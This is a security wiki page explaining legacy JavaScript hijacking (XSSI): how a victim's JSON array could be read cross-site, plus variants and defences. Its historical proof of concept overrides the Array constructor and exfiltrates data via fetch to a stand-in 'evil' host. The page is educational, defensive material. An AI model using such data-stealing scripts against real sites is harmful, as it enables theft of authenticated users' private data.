---
title: JavaScript hijacking (legacy)
slug: javascript-hijacking
---

> **TL;DR:** Pre-CORS attack: include a victim site's JSON-array response as a <script>, override Array constructor, exfil. Historical but informs modern xs-leaks.

## What it is
Before strict MIME enforcement and modern same-origin protection, a victim could be tricked into visiting an attacker page that did `<script src="https://bank/api/transactions">`. The browser sent the victim's cookies, the bank returned a JSON array (`[{...},{...}]`) with a JavaScript-executable content type, and the array literal was evaluated in the attacker's frame. By redefining `Array` or installing setters on `Object.prototype`, the attacker captured the data. The class is now mostly blunted by JSON parsing rules and CORB / [[xs-leaks]] mitigations, but understanding it motivates several still-live defences.

## Preconditions / where it applies
- Endpoint returns a JS-parseable response (top-level array, JSONP, plain JS) with a script-y MIME (`text/javascript`, `application/javascript`)
- Endpoint authenticates via ambient cookies (no CSRF token, no custom header requirement)
- Browser/runtime predates ES5 immutable `Object.prototype` semantics and CORB

## Technique
The historical proof-of-concept relied on overriding the array constructor:

```html
<script>
  function Array() {
    // each new element runs this; siphon via for..in or set traps
    Array.prototype.__defineSetter__('name', v => fetch('//evil/?'+v));
  }
</script>
<script src="https://bank.example/account/transactions"></script>
```

Modern browsers freeze built-ins enough that this exact PoC no longer fires, but related variants persisted for years through:

- **JSONP endpoints** — caller controls callback name, so `<script src="…?callback=alert">` runs arbitrary identifier as a function
- **Setter on `Object.prototype`** — pre-ES5 some engines fired setters on literal `{key:val}` initialisers
- **Comment-stripping leaks** — endpoints returning `for(;;);[{...}]` (Facebook style) were specifically designed to break script parsing — that prefix *is* the mitigation

Modern descendants live in [[xs-leaks]]: `<script>` onerror timing, `performance.measureUserAgentSpecificMemory`, frame-count side channels.

## Detection and defence
- Never return JSON with a script MIME — always `Content-Type: application/json`
- Prefix array responses with `)]}'\n` (Google) or `for(;;);` (Facebook) so script parse fails; legit clients strip the prefix
- Require a custom header (e.g. `X-Requested-With`) that cross-origin scripts cannot set without CORS preflight
- Set `Cross-Origin-Resource-Policy: same-origin` to engage CORB/ORB
- Eliminate JSONP — replace with proper CORS

## References
- [Fortify — JavaScript Hijacking (2007)](https://www.fortify.com/landing/downloads/JavaScript_Hijacking.pdf) — original whitepaper
- [Google — Protecting your users from cross-site script inclusion (XSSI)](https://security.googleblog.com/) — modern guidance
- [XS-Leaks Wiki](https://xsleaks.dev/) — successors and current side channels
